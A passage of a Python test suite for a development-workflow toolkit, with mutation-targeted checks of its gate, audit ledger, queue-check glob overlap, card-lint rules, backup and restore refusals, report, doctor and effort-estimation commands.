          "WARN WORKLOG older" not in out and "WARN WORKLOG older than newest gate_output" in out2, out + out2)
    aw(A, "start", "T-050")
    put(A, "src/a.py", "x = 1\n")
    rc, out = aw(A, "audit", "T-050", env={"OWNS": "src/a.py,src/b.py"})
    check("RED: audit with an OWNS env wider than the card's closed list -> OWNS-DECLARED, AUDIT FAIL",
          rc == 1 and "OWNS-DECLARED differs from the card: missing_from_env=[] not_in_card=['src/b.py']" in out
          and out.strip().splitlines()[-1].startswith("AUDIT FAIL"), out)
    aw(A, "start", "T-050")
    rc, out = aw(A, "audit", "T-050", env={"OWNS": "src/a.py"})
    led = ap / "AUDIT_LEDGER.md"
    b = led.read_bytes()
    led.write_bytes(b.replace(b"verdict=FAIL", b"verdict=PASS", 1))
    aw(A, "start", "T-050")
    rc2, out2 = aw(A, "audit", "T-050", env={"OWNS": "src/a.py"})
    check("RED: one ledger verdict edited in place (same length, nothing cut) -> LEDGER-REWRITTEN, AUDIT FAIL; the audit before the edit passed",
          rc == 0 and out.strip().splitlines()[-1].startswith("AUDIT PASS") and b.count(b"verdict=FAIL") == 1
          and rc2 == 1 and "LEDGER LEDGER-REWRITTEN" in out2 and led.read_bytes().count(b"### RE-AUDIT") == b.count(b"### RE-AUDIT"), out + out2)

    # ---- queue-check: OWNS overlap between cards (literal vs glob, glob vs glob, Depends)
    def card(cid, owns, dep="-"):
        return LINT_CARD_ROTE.replace("T-050", cid).replace("src/a.py", owns).replace("Depends: -", "Depends: " + dep)
    put(A, ".hermes/plans/cards/T-051.md", card("T-051", "src/a*x.py"))
    put(A, ".hermes/plans/cards/T-052.md", card("T-052", "src/k*z.py"))
    put(A, ".hermes/plans/cards/T-053.md", card("T-053", "src/kb*.py"))
    done = "QUEUE DONE 0 PASS / 0 FAIL / 0 STOP\n"
    put(A, ".hermes/plans/cards/QUEUE_gap1.md", "# QUEUE\nChain: base=3 | T-050:+0 T-051:+0 T-052:+0 | final=3\n" + done)
    put(A, ".hermes/plans/cards/QUEUE_gap2.md", "# QUEUE\nChain: base=3 | T-052:+0 T-053:+0 | final=3\n" + done)
    rc1, o1 = aw(A, "queue-check", ".hermes/plans/cards/QUEUE_gap1.md")
    rc2, o2 = aw(A, "queue-check", ".hermes/plans/cards/QUEUE_gap2.md")
    put(A, ".hermes/plans/cards/T-053.md", card("T-053", "src/kb*.py", "T-052"))
    rc3, o3 = aw(A, "queue-check", ".hermes/plans/cards/QUEUE_gap2.md")
    check("queue-check: three cards with no common file (a literal next to a glob that only shares its prefix) -> OK",
          rc1 == 0 and "QUEUE-CHECK OK chain=3 -> ... -> 3" in o1, o1)
    check("RED: queue-check: two globs that can match one file (`src/k*z.py`, `src/kb*.py`) without Depends -> FAIL; with Depends -> OK",
          rc2 == 1 and "T-053: OWNS 'src/kb*.py' overlaps earlier T-052" in o2 and rc3 == 0 and "QUEUE-CHECK OK" in o3, o2 + o3)

    # ---- card-lint: rules whose condition could flip unnoticed
    LG = new_project(work, "gaplint")
    aw(LG, "ratchet", "--raise", "3", "--i-am-architect")

    def lint(text, *flags):
        put(LG, ".hermes/plans/cards/T-050.md", text)
        return aw(LG, "card-lint", "T-050", *flags)
    R = LINT_CARD_ROTE
    noproof = R.replace("$ bash tools/gate.sh pre-T-050\nGATE OK count=3 min=3\n", "$ bash tools/gate.sh pre-T-050\nGATE OK\n")
    assert noproof != R
    for name, text, flags, want_rc, must, must_not in (
        ("L40: the last GATE row does not expect AUDIT PASS", R.replace("re_audit.sh T-050` | `AUDIT PASS` |", "re_audit.sh T-050` | `ok 1` |"), (), 1,
         "LINT ERROR L40 line 43: the LAST GATE row must be", None),
        ("L17: STEPS rows numbered 1, 3", R.replace("| 2 | `python3 -c", "| 3 | `python3 -c"), (), 1, "table row # '3' should be 2", None),
        ("L19: CHAIN says MEASURED, the DRY-RUN PROOF shows no count", noproof, (), 1, "LINT ERROR L19", None),
        ("L19 stays silent when the same card says UNMEASURED", noproof.replace("(MEASURED)", "(UNMEASURED)"), (), None, "CARD-LINT", " L19 "),
        ("L02: a two-letter title", R.replace("# T-050 - probe", "# T-050 - ab"), (), 1, "LINT ERROR L02 line 1: title too short", None),
        ("L02 accepts a three-letter title", R.replace("# T-050 - probe", "# T-050 - abc"), (), 0, "CARD-LINT OK errors=0", "L02"),
        ("L04: a T- card in the CENSUS lane", R.replace("Lane: ROTE", "Lane: CENSUS"), (), 1, "a T- card must use Lane: ROTE (got CENSUS)", None),
        ("L01: a BOM", b"\xef\xbb\xbf" + R.encode("utf-8"), (), 1, "LINT ERROR L01 line 1: BOM at byte 0", None),
        ("L16: AFTER raises the floor to another number (WARN; --strict fails on it)",
         R.replace("Architect: re-baseline? no.", "Architect: ratchet --raise 9 after this card."), ("--strict",), 1, "LINT WARN L16 line 58: AFTER raises the floor", None),
        ("L40: no OWNS= on the re_audit row (WARN)", R.replace("OWNS='src/a.py' bash tools/re_audit.sh", "bash tools/re_audit.sh"), (), 0,
         "LINT WARN L40 line 43: no OWNS='...' on the re_audit row", None),
    ):
        rc, out = lint(text, *flags)
        check("card-lint " + name, (want_rc is None or rc == want_rc) and must in out and (must_not is None or must_not not in out) and "Traceback" not in out, out)


def section_gaps2(work: Path):
    """Engine behaviour that survived a one-token mutation after 2.8.2 (second series): each check fails on a named mutant."""
    print("\n-- gaps, second series: engine commands")
    G = new_project(work, "gaps2")
    plans = G / ".hermes/plans"

    def put(P, rel, data):
        (P / rel).parent.mkdir(parents=True, exist_ok=True)
        (P / rel).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))

    # ---- C1-01 the gate parses the count the suite printed on STDOUT (kills H31, aw.py:189)
    put(G, "tests/out_only.py", 'print("Ran 3 tests")\n')
    env0 = (G / "tools/kit.env").read_text(encoding="utf-8")
    put(G, "tools/kit.env", "\n".join((f"TEST_CMD={sys.executable} -I -B tests/out_only.py" if ln.startswith("TEST_CMD=") else ln)
                                     for ln in env0.split("\n")))
    rc, out = aw(G, "gate", "stdout")
    put(G, "tools/kit.env", env0)
    check("gate reads the count from the suite's STDOUT (a mutant that keeps only stderr -> count=0 -> GATE FAIL)",
          rc == 0 and "GATE OK count=3 min=0" in out, (rc, out))

    # ---- C1-02 an invalid COUNT_REGEX in kit.env is a named refusal, not a Traceback (kills T27, H60; aw.py:71-72)
    put(G, "tools/kit.env", "\n".join(("COUNT_REGEX=(" if ln.startswith("COUNT_REGEX=") else ln) for ln in env0.split("\n")))
    rc, out = aw(G, "gate", "badrx")
    put(G, "tools/kit.env", env0)
    check("RED: an invalid COUNT_REGEX in kit.env -> exit 2 naming COUNT_REGEX, no Traceback, no gate file",
          rc == 2 and "COUNT_REGEX is not a valid regex" in out and "Traceback" not in out
          and not (plans / "gate_output/badrx.txt").exists(), (rc, out))

    # ---- C1-03 a missing kit.env is a named refusal (kills H16, aw.py:64)
    (G / "tools/kit.env").rename(G / "tools/kit.env.off")
    rc, out = aw(G, "gate", "noenv")
    (G / "tools/kit.env.off").rename(G / "tools/kit.env")
    check("RED: a missing tools/kit.env -> exit 2 naming the file, no Traceback",
          rc == 2 and "tools/kit.env missing" in out and "Traceback" not in out, (rc, out))

    # ---- C1-04 six refusals keep their exit code and their word (kills T119, H61, H53, H35, H49, T43)
    ra, oa = aw(G, "integrity", "--write-baseline")
    rb, ob = aw(G, "audit", "T-001", "T-002")
    rh, oh = aw(G, "gate", "--help")
    rq, oq = aw(G, "queue-check", "nope.md")
    put(G, "e_old.txt", "")
    put(G, "e_new.txt", "x\n")
    put(G, "src/p.txt", "a\n")
    rp, op = aw(G, "patch", "src/p.txt", "e_old.txt", "e_new.txt")
    rc_l, oc_l = aw(G, "card-lint", "T-999")
    check("six refusals keep their exit code and their word: integrity --write-baseline -> 2 architect-only; audit with two ids -> 2 usage; "
          "gate --help -> 0 usage; a missing queue file -> 1 not found, no Traceback; an empty patch OLD -> 1 REFUSED with the file untouched; "
          "card-lint on a missing card -> 2 CARD-LINT ERROR naming plans/cards/T-999.md",
          ra == 2 and "--write-baseline is architect-only" in oa
          and rb == 2 and "usage: aw.py audit" in ob
          and rh == 0 and "usage: aw.py" in oh
          and rq == 1 and "queue-check: nope.md not found" in oq and "Traceback" not in oq
          and rp == 1 and "PATCH REFUSED: OLD is empty" in op and (G / "src/p.txt").read_bytes() == b"a\n"
          and rc_l == 2 and "CARD-LINT ERROR card not found:" in oc_l and "plans/cards/T-999.md" in oc_l.replace(os.sep, "/"),
          (ra, oa, rb, ob, rh, oh, rq, oq, rp, op, rc_l, oc_l))

    # ---- C1-05 RED: backup refuses a file outside the project and a missing file (kills H115, aw.py:487)
    outside = work / "outside_gaps2.txt"
    put(work, "outside_gaps2.txt", "x\n")
    r1, o1 = aw(G, "backup", "T-070", str(outside))
    r2, o2 = aw(G, "backup", "T-070", "src/missing.py")
    check("RED: backup refuses a file outside the project and a missing file: exit 1, one message for both, no Traceback, no backups/T-070",
          r1 == 1 and "backup: not a file inside the project" in o1 and "Traceback" not in o1
          and r2 == 1 and "backup: not a file inside the project" in o2 and "Traceback" not in o2
          and not (plans / "backups/T-070").exists(), (r1, o1, r2, o2))

    # ---- C1-06 restore re-creates the directory a backed-up file lived in (kills H25, aw.py:518)
    put(G, "deep/dir/x.py", "v1\n")
    aw(G, "start", "T-071")
    aw(G, "backup", "T-071", "deep/dir/x.py")
    shutil.rmtree(G / "deep")
    rc, out = aw(G, "restore", "T-071")
    check("restore re-creates a removed directory: RESTORED 1, the file back with its bytes, no Traceback",
          rc == 0 and (G / "deep/dir/x.py").read_bytes() == b"v1\n" and "Traceback" not in out, (rc, out))

    # ---- C1-07 report: the newest QUEUE file, its Chain: line and the last five re-audits (kills H102, H91, H40, H6)
    R = new_project(work, "gaps2rep")
    rp = R / ".hermes/plans"
    aw(R, "report")
    rep0 = (rp / "REPORT_latest.md").read_text(encoding="utf-8")
    put(R, ".hermes/plans/cards/QUEUE_a.md", "# QUEUE\nChain: base=3 | T-050:+0 T-051:+0 | final=3\n")
    put(R, ".hermes/plans/cards/QUEUE_b.md", "# QUEUE\nno chain here\n")
    t = time.time()
    os.utime(rp / "cards/QUEUE_b.md", (t - 900, t - 900))
    os.utime(rp / "cards/QUEUE_a.md", (t, t))
    with (rp / "WORKLOG.md").open("a", encoding="utf-8", newline="\n") as f:
        f.write("## T-050 | 2026-01-01T00:00:00 | PASS | gate=OK count=3\n")
    with (rp / "AUDIT_LEDGER.md").open("a", encoding="utf-8", newline="\n") as f:
        f.write("".join(f"### RE-AUDIT n{i}\n" for i in range(1, 7)))
    aw(R, "report")
    rep1 = (rp / "REPORT_latest.md").read_text(encoding="utf-8")
    os.utime(rp / "cards/QUEUE_b.md", (t + 5, t + 5))
    aw(R, "report")
    rep2 = (rp / "REPORT_latest.md").read_text(encoding="utf-8")
    check("report: no QUEUE file -> none; the newest QUEUE -> 'QUEUE_a.md 1/2 in WORKLOG, not done: T-051'; only the last five re-audits; "
          "a queue without a Chain: line -> '(no Chain: line)'",
          "queue: none (no .hermes/plans/cards/QUEUE*.md)" in rep0 and "## last re-audits\n(none)\n" in rep0
          and "queue: QUEUE_a.md 1/2 in WORKLOG, not done: T-051" in rep1
          and "### RE-AUDIT n1\n" not in rep1 and all(f"### RE-AUDIT n{i}\n" in rep1 for i in range(2, 7))
          and "queue: QUEUE_b.md (no Chain: line)" in rep2, (rep0, rep1, rep2))

    # ---- C1-08 doctor: the counts of its last line, ledger-s8, one FAIL (kills H22, H103, H109)
    D = new_project(work, "gaps2doc")
    dp = D / ".hermes/plans"

    def counts(o):
        """(WARN lines, FAIL lines, last line): the summary line is last and itself starts with 'DOCTOR FAIL' on a failing run."""
        ls = o.strip().splitlines()
        return (sum(1 for x in ls[:-1] if x.startswith("DOCTOR WARN ")),
                sum(1 for x in ls[:-1] if x.startswith("DOCTOR FAIL ")), ls[-1])

    rc1, out1 = aw(D, "doctor")
    w1, f1, last1 = counts(out1)
    led = dp / "AUDIT_LEDGER.md"
    b = led.read_bytes()
    put(D, ".hermes/plans/AUDIT_LEDGER.md", b + b"\n## 9. EXTRA\n")
    rc2, out2 = aw(D, "doctor")
    led.write_bytes(b)
    (D / "tools/re_audit.sh").rename(D / "tools/re_audit.sh.off")
    rc3, out3 = aw(D, "doctor")
    aw(D, "report")
    rep = (dp / "REPORT_latest.md").read_text(encoding="utf-8")
    (D / "tools/re_audit.sh.off").rename(D / "tools/re_audit.sh")
    w3, f3, last3 = counts(out3)
    check("doctor: the last line counts its own WARN and FAIL lines; ledger-s8 OK, then WARN after a '## 9.' heading; "
          "a missing tools/re_audit.sh -> exit 1, one FAIL line, and the report repeats warn/fail",
          last1 == f"DOCTOR PASS warn={w1} fail=0" and w1 >= 1 and "DOCTOR OK ledger-s8:" in out1
          and "DOCTOR WARN ledger-s8:" in out2
          and rc3 == 1 and "DOCTOR FAIL kit-files: missing: tools/re_audit.sh" in out3 and f3 == 1
          and last3 == f"DOCTOR FAIL warn={w3} fail=1"
          and f"doctor: FAIL warn={w3} fail=1 (full: `aw.py doctor`)" in rep, (last1, out1, out2, last3, rep[-300:]))

    # ---- C1-09 modules: one existing file under two same-wave globs (kills H71, aw.py:1109)
    M = new_project(work, "gaps2mod")
    head = "# MODULES\n| ID | Module | Purpose | OWNS | Depends | Wave | Gate | Decides | Status |\n|---|---|---|---|---|---|---|---|---|\n"
    put(M, ".hermes/plans/MODULES.md", head + "| M-01 | core | the core | src/*.py | - | W-1 | gate | architect | TODO |\n"
        "| M-02 | api | the api | src/a* | - | W-1 | gate | architect | TODO |\n")
    put(M, "src/a.py", "x\n")
    rc1, o1 = aw(M, "modules")
    put(M, ".hermes/plans/MODULES.md", head + "| M-01 | core | the core | src/*.py | - | W-1 | gate | architect | TODO |\n"
        "| M-02 | api | the api | lib/*.py | - | W-1 | gate | architect | TODO |\n")
    put(M, "lib/b.py", "x\n")
    rc2, o2 = aw(M, "modules")
    check("modules: two same-wave globs that both match one existing file -> exit 1 'both own an existing file via'; "
          "the same two globs disjoint -> MODULES OK modules=2 waves=1",
          rc1 == 1 and "both own an existing file via" in o1 and rc2 == 0 and "MODULES OK modules=2 waves=1" in o2, (rc1, o1, rc2, o2))

    # ---- C1-10 improve: exact counts and a four-column status update (kills H69, T60, aw.py:653-656)
    I = new_project(work, "gaps2imp")
    with (I / ".hermes/plans/ARCHITECT_FEEDBACK.md").open("a", encoding="utf-8", newline="\n") as f:
        f.write("## 2026-01-01 | F-001 | skips red | OPEN\n## 2026-01-02 | F-002 | wrong count | IGNORED\n"
                "## 2026-01-03 | F-003 | slow gate | APPLIED\n## 2026-01-04 | status F-001 | re-checked | APPLIED\n")
    rc, out = aw(I, "improve")
    check("improve: four-column rows count once each and a later 'status F-001' row moves that entry (OPEN=0 APPLIED=2 IGNORED=1); "
          "only the IGNORED entry gets an action",
          "IMPROVE feedback OPEN=0 APPLIED=2 IGNORED=1 AUTOMATED=0" in out
          and "IMPROVE ACTION ignored-correction F-002 (wrong count)" in out and "open-correction" not in out, out)

    # ---- C1-11 next-id skips non-.md files, templates and the guide (kills H67, T57, aw.py:581)
    N = new_project(work, "gaps2ids")

    def nid():
        return aw(N, "next-id", "T")[1].strip().splitlines()[-1]

    base = nid()
    put(N, ".hermes/plans/cards/T-700.md", "# T-700 - probe\n")
    n1 = nid()
    (N / ".hermes/plans/cards/T-700.md").rename(N / ".hermes/plans/cards/T-700.md.off")
    n2 = nid()
    put(N, ".hermes/plans/cards/X.template.md", "# T-800 - example\n")
    n3 = nid()
    with (N / ".hermes/plans/GUIDE.md").open("a", encoding="utf-8", newline="\n") as f:
        f.write("\n# T-900 - example\n")
    n4 = nid()
    check("next-id: a card title counts (T-701), while a renamed .off file, a *.template.md and a '# T-900' line in GUIDE.md count for nothing",
          n1 == "T-701" and n2 == base and n3 == base and n4 == base, (base, n1, n2, n3, n4))

    # ---- C1-12 audit without WORKLOG.md (kills H28, aw.py:456)
    A = new_project(work, "gaps2aud")
    ap = A / ".hermes/plans"
    aw(A, "gate", "baseline")
    (ap / "WORKLOG.md").rename(ap / "WORKLOG.md.off")
    rc, out = aw(A, "audit")
    (ap / "WORKLOG.md.off").rename(ap / "WORKLOG.md")
    check("audit without WORKLOG.md: no Traceback and the last line is still a verdict",
          "Traceback" not in out and out.strip().splitlines()[-1].startswith("AUDIT "), (rc, out))

    # ---- C1-13 RED: a legacy task-start marker still reports a file outside OWNS (kills T19, T110, aw.py:375/383)
    aw(A, "ratchet", "--raise", "3", "--i-am-architect")
    put(A, ".hermes/plans/cards/T-050.md", LINT_CARD_ROTE)
    aw(A, "integrity", "--write-baseline", "--i-am-architect")
    aw(A, "start", "T-050")
    rec = json.loads((A / ".aw/task-start").read_text(encoding="utf-8"))
    rec.update(version=1, files={}, t0=time.time())
    put(A, ".aw/task-start", json.dumps(rec))
    time.sleep(0.05)
    put(A, "src/a.py", "x = 1\n")
    put(A, "src/zz_out.py", "x\n")
    rc, out = aw(A, "audit", "T-050", env={"OWNS": "src/a.py"})
    check("RED: a legacy v1 task-start marker still reports the file outside OWNS: exit 1, 'OWNS 1 outside OWNS', 'OUT src/zz_out.py'",
          rc == 1 and "OWNS 1 outside OWNS" in out and "OUT src/zz_out.py" in out, (rc, out))


def section_gaps3(work: Path):
    """OWNS overlap and card parsing that survived a one-token mutation after 2.8.2 (second series)."""
    print("\n-- gaps, second series: queue-check overlap and card-lint")

    def put(P, rel, data):
        (P / rel).parent.mkdir(parents=True, exist_ok=True)
        (P / rel).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))

    # ---- queue-check: _overlap, in both card orders
    Q = new_project(work, "gaps3q")
    aw(Q, "gate", "baseline")
    aw(Q, "ratchet", "--raise", "3", "--i-am-architect")
    aw(Q, "integrity", "--write-baseline", "--i-am-architect")
    for cid, owns in (("T-061", "src/a*.py"), ("T-062", "src/k*.py"), ("T-063", "src/k*x.py"), ("T-064", "src/kb*.py"), ("T-065", "src/k*a*z.py")):
        put(Q, f".hermes/plans/cards/{cid}.md", LINT_CARD_ROTE.replace("T-050", cid).replace("src/a.py", owns))

    def queue(name, a, b):
        put(Q, f".hermes/plans/cards/{name}.md", f"# QUEUE\nChain: base=3 | {a}:+0 {b}:+0 | final=3\nQUEUE DONE 0 PASS / 0 FAIL / 0 STOP\n")
        return aw(Q, "queue-check", f".hermes/plans/cards/{name}.md")
    rc, out = queue("QUEUE_g1", "T-061", "T-062")
    check("queue-check: two globs with different literal prefixes and the same tail (`src/a*.py`, `src/k*.py`) share no file -> OK",
          rc == 0 and "QUEUE-CHECK OK" in out, out)
    rc1, o1 = queue("QUEUE_g2", "T-063", "T-064")
    rc2, o2 = queue("QUEUE_g3", "T-064", "T-063")
    check("RED: queue-check: `src/k*x.py` and `src/kb*.py` can match one file -> FAIL in either card order",
          rc1 == 1 and "T-064: OWNS 'src/kb*.py' overlaps earlier T-063" in o1 and rc2 == 1 and "T-063: OWNS 'src/k*x.py' overlaps earlier T-064" in o2, o1 + o2)
    rc1, o1 = queue("QUEUE_g4", "T-065", "T-064")
    rc2, o2 = queue("QUEUE_g5", "T-064", "T-065")
    check("RED: queue-check: a glob with two wildcards (`src/k*a*z.py`) against `src/kb*.py` -> FAIL in either card order",
          rc1 == 1 and "T-064: OWNS 'src/kb*.py' overlaps earlier T-065" in o1 and rc2 == 1 and "T-065: OWNS 'src/k*a*z.py' overlaps earlier T-064" in o2, o1 + o2)

    # ---- card-lint: fence borders, exempt sections, which lines are commands, the line a finding names
    LG = new_project(work, "gaps3lint")
    aw(LG, "ratchet", "--raise", "3", "--i-am-architect")

    def lint(text):
        put(LG, ".hermes/plans/cards/T-050.md", text)
        return aw(LG, "card-lint", "T-050")
    R = LINT_CARD_ROTE
    P2 = "python3 -I -B tools/aw.py patch src/a.py old.txt"
    OK = "CARD-LINT OK errors=0"
    rows = (
        ("L14: CHAIN arithmetic is reported at the CHAIN line itself",
         "CHAIN: ran=3 +0 -> ran=3 (MEASURED)", "CHAIN: ran=3 +1 -> ran=3 (MEASURED)", 1, "LINT ERROR L14 line 39: CHAIN arithmetic: 3+1 != 3", None),
        ("L06: a placeholder on the line after an EMPTY fenced block is outside the fence",
         "## OWNS\n", "```text\n```\nTODO fill this\n\n## OWNS\n", 1, "LINT ERROR L06 line 9: placeholder 'TODO' left in", None),
        ("a placeholder inside the SECOND of two adjacent fenced blocks stays inside a fence",
         "## OWNS\n", "```text\nfirst\n```\n```text\nTODO inside a block\n```\n\n## OWNS\n", 0, OK, " L06 "),
        ("a `## GATE` line inside a heredoc body is not a section heading",
         "x = 1\nEOF\n", "x = 1\n## GATE\nEOF\n", 0, OK, None),
        ("L06 skips prose inside DRY-RUN PROOF",
         "## DRY-RUN PROOF\n", "## DRY-RUN PROOF\nTODO was printed by the tool and is kept verbatim\n", 0, OK, " L06 "),
        ("L16 skips a fenced line outside DRY-RUN PROOF",
         "x = 1\nEOF\n", "x = 1  # min=9\nEOF\n", 0, OK, " L16 "),
        ("L12: a two-argument `aw.py patch` in a STEPS shell block is a command",
         "cat > src/a.py <<'EOF'\n", P2 + "\ncat > src/a.py <<'EOF'\n", 1, "LINT ERROR L12 line 30: aw.py patch needs exactly 3 args", None),
        ("the same line as a comment in that shell block is not a command",
         "cat > src/a.py <<'EOF'\n", "# " + P2 + "\ncat > src/a.py <<'EOF'\n", 0, OK, " L12 "),
        ("the same command quoted in a ```text block of BACKUP is not a command",
         "NEW: src/a.py\n", "NEW: src/a.py\n\n```text\nexample only: `" + P2 + "`\n```\n", 0, OK, " L12 "),
        ("the same command in a shell block of GOAL (not a command section) is not a command",
         "## OWNS\n", "```bash\n" + P2 + "\n```\n\n## OWNS\n", 0, OK, " L12 "),
        ("L15 names the PRE-FLIGHT count, not the floor",
         "| `GATE OK count=3 min=3` |\n| 2 | `python3 -I -B tools/aw.py integrity`", "| `GATE OK count=4 min=3` |\n| 2 | `python3 -I -B tools/aw.py integrity`",
         1, "PRE-FLIGHT count=4 != CHAIN ran=3", None),
    )
    for name, old, new, want_rc, must, must_not in rows:
        assert R.count(old) == 1, old
        rc, out = lint(R.replace(old, new))
        check("card-lint " + name, rc == want_rc and must in out and (must_not is None or must_not not in out) and "Traceback" not in out, out)


def section_gaps_mod1(work: Path):
    """Behaviour that a one-token change of effort.py, init_project.py or setup_project.py could alter with the suite still green.
    Replays the survivors of wk/D1_effort.jsonl (29), wk/D1_init.jsonl (25) and wk/D1_setup.jsonl (19); every check names the rows it kills."""
    print("\n-- gaps, third series: effort.py, init_project.py, setup_project.py")
    py = sys.executable
    INIT = str(KIT / "init_project.py")
    SETUP = str(KIT / "setup_project.py")

    def put(P, rel, data):
        (P / rel).parent.mkdir(parents=True, exist_ok=True)
        (P / rel).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))

    def ini(*a):
        return sh([py, "-B", INIT, *a], cwd=work)

    # ================= effort.py =================
    EF = new_project(work, "effmod")
    (EF / ".hermes/plans/cards").mkdir(parents=True, exist_ok=True)
    env0 = (EF / "tools/kit.env").read_text(encoding="utf-8")
    auto = env0.replace("EFFORT_WORKER=ultra", "EFFORT_WORKER=auto")
    put(EF, "tools/kit.env", auto)

    def eff(*a):
        return sh([py, "-I", "-B", "tools/effort.py", *a], cwd=EF)

    # kills effort.py:91 rows 4 (or->and in the docstring fallback), 62 (return 2), 109 (split(...)[1])
    rc, out = eff()
    check("effort.py with no arguments -> exit 2, the docstring's FIRST line and the usage line (a mutant that prints an empty first line, the second docstring line, or exits 3 fails)",
          rc == 2 and out.splitlines()[0].startswith("effort.py - which reasoning effort") and "usage: effort.py stage|card ID|queue" in out
          and "Traceback" not in out, out)

    # kills effort.py:79 row 46 (cmd == "card" and arg -> or)
    rc, out = eff("card")
    check("effort.py `card` without an id -> the usage line and exit 2, not a W0 line judged for the empty id", rc == 2 and "usage: effort.py" in out, out)

    MIN = ("# T-100 - minimal card\nStatus: TODO | Lane: ROTE | Depends: - | Module: - | Author decisions needed: none\n\n"
           "## GOAL\nx\n\n## OWNS\n- src/a.py\n\n## READ-ONLY\n- nothing else\n\n## STEPS\n| # | Command | Expected |\n|---|---|---|\n| 1 | `echo 1` | `1` |\n")
    put(EF, ".hermes/plans/cards/T-100.md", MIN)
    # kills effort.py:42 row 35 (steps += 2), :43 rows 11 (owns += 2) and 105 (and -> or), :33 row 56 (fb = 1)
    rc, out = eff("card", "T-100")
    check("effort.py card under EFFORT_WORKER=auto: one STEPS row, one OWNS line, no fence -> W4 medium with steps=1 fenced=0B owns=1 (a doubled STEP/OWNS counter, an OWNS count that also takes '-' lines of other sections, or fb starting at 1 changes the line)",
          rc == 0 and out.strip() == "EFFORT medium worker W4 T-100 ROTE within size (steps=1 fenced=0B owns=1)", out)

    # kills effort.py:49 row 16 (group(1) -> group(2): the E1 line names the card, not FAIL)
    put(EF, ".hermes/plans/WORKLOG.md", "\n## T-100 | 2026-11-08T10:00:00+0200 | FAIL | probe\nfiles: none\nfor author/architect: Q-001 Q-002\n")
    put(EF, ".hermes/plans/QUESTIONS.md", "ANSWER Q-001 2026-11-08 fixed\n")
    rc1, o1 = eff("stage")
    put(EF, ".hermes/plans/QUESTIONS.md", "ANSWER Q-001 2026-11-08 fixed\nANSWER Q-002 2026-11-08 also\n")
    rc2, o2 = eff("stage")
    check("effort.py stage: newest WORKLOG entry is a FAIL with two questions and one ANSWER -> E1 ultra naming that card (T-100); with both answered -> E4 medium at the default level",
          rc1 == 0 and o1.strip().startswith("EFFORT ultra architect E1 ") and "(T-100)" in o1
          and rc2 == 0 and o2.strip().startswith("EFFORT medium architect E4 "), (o1, o2))

    rc, out = eff("card", "T-999")
    check("effort.py card on an id that has no file -> W0 at the DEFAULT level and `card T-999 not found or empty` (the queue checks below judge such cards)",
          rc == 0 and out.strip() == "EFFORT medium worker W0 card T-999 not found or empty", out)

    FA = ("# T-101 - fence closed by a fence of the same char and length\nStatus: TODO | Lane: ROTE | Depends: - | Module: - | Author decisions needed: none\n\n"
          "## OWNS\n- src/a.py\n\n## STEPS\n| 1 | `echo a` | `a` |\n```bash\necho 1\necho 22\n```\n| 2 | `echo b` | `b` |\n")
    put(EF, ".hermes/plans/cards/T-101.md", FA)
    # kills effort.py:38 rows 21 (== -> !=) and 24 (>= -> <): a block closed by an equal fence must close, or the rest becomes fenced bytes
    rc, out = eff("card", "T-101")
    check("effort.py facts: a ``` block inside STEPS closed by an equal fence -> both STEPS rows count and the block is 15 fenced bytes (a mutant that never closes an equal fence, or needs a longer one, keeps the following row fenced: steps=1 fenced=... instead of steps=2 fenced=15B)",
          rc == 0 and out.strip() == "EFFORT medium worker W4 T-101 ROTE within size (steps=2 fenced=15B owns=1)", out)

    FB = ("# T-102 - a tilde fence line inside a backtick block\nStatus: TODO | Lane: ROTE | Depends: - | Module: - | Author decisions needed: none\n\n"
          "## OWNS\n- src/a.py\n\n## STEPS\n```bash\necho 1\n~~~\n| 1 | `x` | `1` |\n```\n")
    put(EF, ".hermes/plans/cards/T-102.md", FB)
    # kills effort.py:38 rows 20 (and -> or), 42 (== -> !=) and 50 (and -> or): a ~~~ line inside a ``` block must NOT close it
    rc, out = eff("card", "T-102")
    check("effort.py facts: a ~~~ line inside a ``` block does not close it -> the STEPS row after it stays fenced (steps=0 fenced=25B); a mutant that closes on a fence of another char, or on any long-enough fence line, turns it into a STEPS row",
          rc == 0 and out.strip() == "EFFORT medium worker W4 T-102 ROTE within size (steps=0 fenced=25B owns=1)", out)

    FC = ("# T-103 - fenced bytes in DRY-RUN PROOF do not count\nStatus: TODO | Lane: ROTE | Depends: - | Module: - | Author decisions needed: none\n\n"
          "## OWNS\n- src/a.py\n\n## STEPS\n```bash\necho 1\n```\n\n## DRY-RUN PROOF\n```\n" + "z" * 60 + "\n```\n")
    put(EF, ".hermes/plans/cards/T-103.md", FC)
    # kills effort.py:40 row 37 (len(ln) + 1 -> + 2): only the STEPS fence counts, one line of 7 bytes, the 61-byte DRY-RUN line adds nothing
    rc, out = eff("card", "T-103")
    check("effort.py facts: fenced bytes outside DRY-RUN PROOF count as len(line)+1 (a one-line STEPS fence -> fenced=7B) and a 61-byte DRY-RUN PROOF fence adds nothing",
          rc == 0 and out.strip() == "EFFORT medium worker W4 T-103 ROTE within size (steps=0 fenced=7B owns=1)", out)

    FD = "# T-104 - ten STEPS rows\nStatus: TODO | Lane: ROTE | Depends: - | Module: - | Author decisions needed: none\n\n## OWNS\n- src/a.py\n\n## STEPS\n| # | C | E |\n|---|---|---|\n" + "".join(f"| {i} | `e` | `{i}` |\n" for i in range(1, 11))
    put(EF, ".hermes/plans/cards/T-104.md", FD)
    # kills effort.py:65 row 92 (steps >= 10 -> 11)
    rc, out = eff("card", "T-104")
    check("effort.py card: exactly 10 STEPS rows and nothing else -> W3 ultra, 'steps=10 fenced=0B owns=1' (the >= 10 boundary; 11 would leave it a W4)",
          rc == 0 and out.strip() == "EFFORT ultra worker W3 T-104 is large (steps=10 fenced=0B owns=1): split it, else run it hard", out)

    FE = "# T-105 - exactly 4000 fenced bytes\nStatus: TODO | Lane: ROTE | Depends: - | Module: - | Author decisions needed: none\n\n## OWNS\n- src/a.py\n\n## STEPS\n```\n" + "abcdefghi\n" * 400 + "```\n"
    put(EF, ".hermes/plans/cards/T-105.md", FE)
    # kills effort.py:65 row 65 (fb >= 4000 -> 4001)
    rc, out = eff("card", "T-105")
    check("effort.py card: a STEPS fence of exactly 4000 bytes (400 lines of 9 chars) -> W3 ultra, 'fenced=4000B' (the >= 4000 boundary; 4001 would leave it a W4)",
          rc == 0 and out.strip() == "EFFORT ultra worker W3 T-105 is large (steps=0 fenced=4000B owns=1): split it, else run it hard", out)

